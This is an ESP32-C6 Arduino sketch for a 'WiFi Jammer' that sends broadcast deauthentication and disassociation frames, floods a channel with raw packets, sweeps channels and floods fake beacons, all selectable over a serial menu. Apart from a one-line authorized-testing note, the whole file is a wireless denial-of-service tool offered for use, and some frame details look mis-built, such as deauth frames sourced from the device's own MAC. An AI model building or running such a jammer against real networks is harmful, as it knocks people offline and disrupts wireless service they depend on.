// H13 — WiFi Jammer (ESP32-C6)
// Channel flooding, deauth broadcast, WiFi DoS testing
// NOTE: Only use on networks you own or have written permission to test.

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_now.h>

// ── Configuration ──────────────────────────────────────────────
#define SERIAL_BAUD         115200
#define DEAUTH_INTERVAL_MS  100
#define FLOOD_PACKET_SIZE   256
#define CHANNEL_MIN         1
#define CHANNEL_MAX         13
#define BROADCAST_MAC       {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}

// ── Deauth frame template (802.11 management) ─────────────────
// Reason code 7 = Class 3 frame from non-associated STA
const uint8_t deauthFrame[] = {
  0xC0, 0x00,                      // Type: Deauthentication
  0x3A, 0x01,                      // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: Broadcast
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // Source (overwritten)
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // BSSID (overwritten)
  0x00, 0x00,                      // Sequence control
  0x07, 0x00                       // Reason code
};

// ── Disassoc frame template ──────────────────────────────────
const uint8_t disassocFrame[] = {
  0xA0, 0x00,                      // Type: Disassociation
  0x3A, 0x01,                      // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
  0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,
  0x00, 0x00,
  0x08, 0x00                       // Reason code
};

// ── Jamming modes ────────────────────────────────────────────
enum JamMode {
  JAM_OFF = 0,
  JAM_DEAUTH_BROADCAST,
  JAM_CHANNEL_FLOOD,
  JAM_CHANNEL_SWEEP,
  JAM_BEACON_FLOOD
};
JamMode currentMode = JAM_OFF;

// ── State ────────────────────────────────────────────────────
uint8_t targetMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t channel = 6;
uint32_t packetsSent = 0;
uint32_t lastFlood = 0;

// Forward declarations
void startJamMode(JamMode mode);
void stopJamMode();
void sendDeauthBroadcast();
void sendChannelFlood();
void sweepChannels();
void sendBeaconFlood();
void printStatus();

// ── Setup ─────────────────────────────────────────────────────
void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(500);
  Serial.println(F("\n=== H13 — WiFi Jammer (ESP32-C6) ==="));
  Serial.println(F("FOR AUTHORIZED TESTING ONLY.\n"));

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);

  Serial.println(F("Commands:"));
  Serial.println(F("  1 = Deauth broadcast (all clients)"));
  Serial.println(F("  2 = Channel flood (data flooding)"));
  Serial.println(F("  3 = Channel sweep (all channels)"));
  Serial.println(F("  4 = Beacon flood"));
  Serial.println(F("  0 = STOP"));
  Serial.println(F("  c = Set channel (c6, c11, etc.)"));
  Serial.println(F("  s = Status\n"));
}

// ── Main loop ─────────────────────────────────────────────────
void loop() {
  // Serial command handler
  if (Serial.available()) {
    char c = Serial.read();
    switch (c) {
      case '1': startJamMode(JAM_DEAUTH_BROADCAST); break;
      case '2': startJamMode(JAM_CHANNEL_FLOOD); break;
      case '3': startJamMode(JAM_CHANNEL_SWEEP); break;
      case '4': startJamMode(JAM_BEACON_FLOOD); break;
      case '0': stopJamMode(); break;
      case 'c': case 'C': {
        int ch = Serial.parseInt();
        if (ch >= CHANNEL_MIN && ch <= CHANNEL_MAX) {
          channel = ch;
          esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
          Serial.printf("Channel set to %d\n", channel);
        }
        break;
      }
      case 's': case 'S': printStatus(); break;
    }
  }

  if (currentMode == JAM_OFF) return;

  uint32_t now = millis();

  switch (currentMode) {
    case JAM_DEAUTH_BROADCAST:
      if (now - lastFlood >= DEAUTH_INTERVAL_MS) {
        lastFlood = now;
        sendDeauthBroadcast();
      }
      break;

    case JAM_CHANNEL_FLOOD:
      if (now - lastFlood >= 10) {
        lastFlood = now;
        sendChannelFlood();
      }
      break;

    case JAM_CHANNEL_SWEEP:
      if (now - lastFlood >= 50) {
        lastFlood = now;
        sweepChannels();
      }
      break;

    case JAM_BEACON_FLOOD:
      if (now - lastFlood >= 20) {
        lastFlood = now;
        sendBeaconFlood();
      }
      break;

    default: break;
  }
}

// ── Start jam mode ───────────────────────────────────────────
void startJamMode(JamMode mode) {
  currentMode = mode;
  packetsSent = 0;
  esp_wifi_set_promiscuous(true);

  const char* modeNames[] = { "OFF", "DEAUTH", "FLOOD", "SWEEP", "BEACON" };
  Serial.printf("[JAM] Mode: %s\n", modeNames[mode]);
}

// ── Stop jam ─────────────────────────────────────────────────
void stopJamMode() {
  currentMode = JAM_OFF;
  esp_wifi_set_promiscuous(false);
  Serial.printf("[STOP] Packets sent: %lu\n", packetsSent);
}

// ── Deauth broadcast ─────────────────────────────────────────
void sendDeauthBroadcast() {
  uint8_t frame[sizeof(deauthFrame)];
  memcpy(frame, deauthFrame, sizeof(frame));

  // Set source from actual MAC
  uint8_t mac[6];
  WiFi.macAddress(mac);
  memcpy(&frame[10], mac, 6);
  memcpy(&frame[16], mac, 6);

  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  packetsSent++;

  if (packetsSent % 100 == 0) {
    Serial.printf("[DEAUTH] Sent: %lu (ch %d)\n", packetsSent, channel);
  }
}

// ── Channel flood ────────────────────────────────────────────
void sendChannelFlood() {
  uint8_t flood[FLOOD_PACKET_SIZE];
  memset(flood, 0x69, sizeof(flood));

  // Randomize some bytes to avoid compression
  for (int i = 0; i < 16; i++) flood[i] = random(0, 256);

  esp_wifi_80211_tx(WIFI_IF_STA, flood, sizeof(flood), false);
  packetsSent++;

  if (packetsSent % 500 == 0) {
    Serial.printf("[FLOOD] Sent: %lu (ch %d)\n", packetsSent, channel);
  }
}

// ── Channel sweep ────────────────────────────────────────────
void sweepChannels() {
  channel++;
  if (channel > CHANNEL_MAX) channel = CHANNEL_MIN;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Send deauth on each channel
  sendDeauthBroadcast();
}

// ── Beacon flood ─────────────────────────────────────────────
void sendBeaconFlood() {
  uint8_t beacon[200];
  int pos = 0;

  // Beacon frame header
  beacon[pos++] = 0x80;  // Beacon type
  beacon[pos++] = 0x00;
  beacon[pos++] = 0x00;  // Duration
  beacon[pos++] = 0x00;

  // Destination: broadcast
  memset(&beacon[pos], 0xFF, 6); pos += 6;

  // Source MAC
  uint8_t mac[6];
  WiFi.macAddress(mac);
  memcpy(&beacon[pos], mac, 6); pos += 6;

  // BSSID
  memcpy(&beacon[pos], mac, 6); pos += 6;

  // Sequence control
  beacon[pos++] = 0x00;
  beacon[pos++] = 0x00;

  // Fixed parameters (Beacon interval 100ms, Capability info)
  beacon[pos++] = 0x64;  // Beacon interval
  beacon[pos++] = 0x00;
  beacon[pos++] = 0x31;  // Capability
  beacon[pos++] = 0x04;

  // SSID element
  beacon[pos++] = 0x00;  // SSID tag
  char ssid[20];
  snprintf(ssid, sizeof(ssid), "JAM-%02X-%d", mac[4], random(0, 255));
  beacon[pos++] = strlen(ssid);
  memcpy(&beacon[pos], ssid, strlen(ssid));
  pos += strlen(ssid);

  // Supported rates
  beacon[pos++] = 0x01;  // Tag
  beacon[pos++] = 0x08;  // Length
  beacon[pos++] = 0x82;  // 1 Mbps
  beacon[pos++] = 0x84;  // 2 Mbps
  beacon[pos++] = 0x8B;  // 5.5 Mbps
  beacon[pos++] = 0x96;  // 11 Mbps
  beacon[pos++] = 0x24;  // 18 Mbps
  beacon[pos++] = 0x30;  // 24 Mbps
  beacon[pos++] = 0x48;  // 36 Mbps
  beacon[pos++] = 0x6C;  // 54 Mbps

  esp_wifi_80211_tx(WIFI_IF_STA, beacon, pos, false);
  packetsSent++;

  if (packetsSent % 200 == 0) {
    Serial.printf("[BEACON] Sent: %lu (%s)\n", packetsSent, ssid);
  }
}

// ── Status ───────────────────────────────────────────────────
void printStatus() {
  Serial.printf("\n── H13 Status ──\n");
  Serial.printf("Mode:       %d\n", currentMode);
  Serial.printf("Channel:    %d\n", channel);
  Serial.printf("Packets:    %lu\n", packetsSent);
  Serial.printf("Uptime:     %lu s\n", millis() / 1000);
  Serial.printf("MAC:        %s\n", WiFi.macAddress().c_str());
  Serial.printf("WiFi mode:  %d\n", WiFi.getMode());
  Serial.println();
}
